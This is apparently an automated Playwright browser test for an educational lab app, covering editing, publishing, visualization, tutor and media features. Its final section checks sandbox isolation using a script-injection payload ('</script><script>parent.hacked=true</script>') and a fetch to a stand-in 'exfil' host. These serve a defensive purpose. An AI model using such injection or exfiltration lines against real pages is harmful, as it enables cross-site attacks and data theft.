// Run after the frontend build. GYM_PLAYWRIGHT_MODULE can point at a bundled
// Playwright installation; no browser or learner profile is reused.
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createInterface } from "node:readline";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";
import { visualizationDocument } from "../src/labVisualization.js";

const require = createRequire(import.meta.url);
const { chromium } = require(process.env.GYM_PLAYWRIGHT_MODULE || "playwright");
const root = fileURLToPath(new URL("../../", import.meta.url));
const server = spawn(`${root}.venv/bin/python`, ["tests/rich_lab_server.py"], {
  cwd: root,
  env: { ...process.env, PYTHONPATH: root },
  stdio: ["ignore", "pipe", "pipe"],
});
let serverErrors = "";
server.stderr.on("data", (chunk) => (serverErrors += chunk));
const browser = await chromium.launch({ headless: true });
try {
  const url = await new Promise((resolve, reject) => {
    const timer = setTimeout(
      () => reject(new Error(`Fixture startup timed out: ${serverErrors}`)),
      10000,
    );
    createInterface({ input: server.stdout }).once("line", (line) => {
      clearTimeout(timer);
      resolve(JSON.parse(line).url);
    });
    server.once("exit", (code) => {
      clearTimeout(timer);
      reject(new Error(`Fixture exited ${code}: ${serverErrors}`));
    });
  });
  for (let n = 0; n < 50; n++) {
    try {
      if ((await fetch(`${url}/api/overview`)).ok) break;
    } catch {}
    await new Promise((r) => setTimeout(r, 100));
  }
  const page = await browser.newPage({
    viewport: { width: 1440, height: 1100 },
  });
  const errors = [],
    external = [];
  page.on("pageerror", (e) => errors.push(e.message));
  page.on("request", (r) => {
    if (
      r.url().startsWith("https://") &&
      !["font", "stylesheet"].includes(r.resourceType())
    )
      external.push(r.url());
  });
  await page.route("https://media.example.test/**", (route) =>
    route.fulfill({
      status: 200,
      contentType: "audio/wav",
      body: (() => {
        const wav = Buffer.alloc(16044);
        wav.write("RIFF", 0);
        wav.writeUInt32LE(16036, 4);
        wav.write("WAVEfmt ", 8);
        wav.writeUInt32LE(16, 16);
        wav.writeUInt16LE(1, 20);
        wav.writeUInt16LE(1, 22);
        wav.writeUInt32LE(8000, 24);
        wav.writeUInt32LE(16000, 28);
        wav.writeUInt16LE(2, 32);
        wav.writeUInt16LE(16, 34);
        wav.write("data", 36);
        wav.writeUInt32LE(16000, 40);
        return wav;
      })(),
    }),
  );
  await page.goto(url);
  await page.getByRole("button", { name: "Labs", exact: true }).click();
  await page.getByRole("button", { name: "Open lab", exact: false }).click();
  await page.getByRole("button", { name: "Edit lab", exact: true }).click();
  assert.equal(
    await page.getByLabel(/^Media URL/).inputValue(),
    "https://media.example.test/lesson.wav",
  );
  await page.getByLabel("Target response words").fill("120");
  await page.getByLabel(/^Learning objectives/).fill("Explain cycle count\n");
  await page
    .getByRole("button", { name: "Validate & preview", exact: true })
    .first()
    .click();
  await page
    .getByRole("button", { name: "Try visualization", exact: true })
    .click();
  await page
    .frameLocator(".lab-visualization-frame")
    .frameLocator("iframe")
    .locator("canvas")
    .waitFor();
  const previewState = await (await fetch(`${url}/api/labs/wave-lab`)).json();
  assert.equal(previewState.activities.length, 0);
  assert.deepEqual(external, []);
  await page.getByRole("button", { name: "Publish", exact: false }).click();
  await page
    .getByRole("button", { name: "Start learning session", exact: true })
    .click();
  await page.getByRole("slider", { name: "Frequency", exact: true }).fill("3");
  await page
    .getByRole("button", { name: "Run visualization", exact: true })
    .click();
  const visual = page
    .frameLocator(".lab-visualization-frame")
    .frameLocator("iframe");
  await visual.locator("canvas").waitFor();
  assert.equal(
    await visual.locator("canvas").evaluate(() => gym.parameters.frequency),
    3,
  );
  await page
    .getByLabel("Message to Reason about waves")
    .fill("Why are there more cycles?");
  await page
    .getByRole("button", { name: "Send to tutor", exact: true })
    .click();
  await page
    .getByText(
      "Compare two cycles with three cycles over the same interval. What changed?",
      { exact: true },
    )
    .waitFor();
  await page.getByRole("button", { name: "Load audio", exact: true }).click();
  await page.locator("audio").waitFor();
  const lab = await (await fetch(`${url}/api/labs/wave-lab`)).json();
  const visit = await (
    await fetch(`${url}/api/lab-activities/${lab.activities[0].id}`)
  ).json();
  assert.equal(visit.discussions["discussion-1"].turns.length, 1);
  assert.equal(visit.visualization_inputs["visualization-1"].frequency, 3);
  assert.equal(visit.help_count, 1);
  // Starting the existing lesson UI records its reading; loading media adds one.
  assert.equal(visit.reading_count, 2);
  assert.equal(visit.mastery_awarded, false);
  await page.screenshot({
    path: process.env.GYM_SCREENSHOT || "/tmp/rich-labs-browser.png",
    fullPage: true,
  });
  assert.deepEqual(errors, []);

  // Adversarial authored data stays inside the inner opaque frame. The wrapper
  // denies navigation as well as fetch; data cannot close its script element.
  const sandbox = await browser.newPage();
  const requests = [];
  sandbox.on("request", (r) => requests.push(r.url()));
  await sandbox.setContent(
    '<h1 id="parent">Private parent</h1><iframe id="outer" sandbox="allow-scripts"></iframe>',
  );
  const doc = visualizationDocument(
    {
      html: '<output id="result"></output>',
      javascript:
        'document.querySelector("#result").textContent=gym.data.sample;',
      data: { sample: "</script><script>parent.hacked=true</script>" },
    },
    {},
  );
  await sandbox
    .locator("#outer")
    .evaluate((el, html) => (el.srcdoc = html), doc);
  const inner = sandbox
    .frameLocator("#outer")
    .frameLocator("iframe")
    .locator("#result");
  await inner.waitFor();
  assert.equal(
    await inner.textContent(),
    "</script><script>parent.hacked=true</script>",
  );
  assert.equal(
    await inner.evaluate(() => {
      try {
        return parent.document.body.textContent;
      } catch {
        return "blocked";
      }
    }),
    "blocked",
  );
  await inner.evaluate(() => {
    fetch("https://example.test/exfil").catch(() => {});
    location.href = "https://example.test/navigation";
  });
  await sandbox.waitForTimeout(300);
  assert.deepEqual(requests, []);
  assert.equal(
    await sandbox.locator("#parent").textContent(),
    "Private parent",
  );
  console.log(
    "Rich lab browser checks passed: editor, preview, publication, controls, media, tutor, evidence and sandbox isolation.",
  );
} finally {
  await browser.close();
  server.kill("SIGTERM");
}
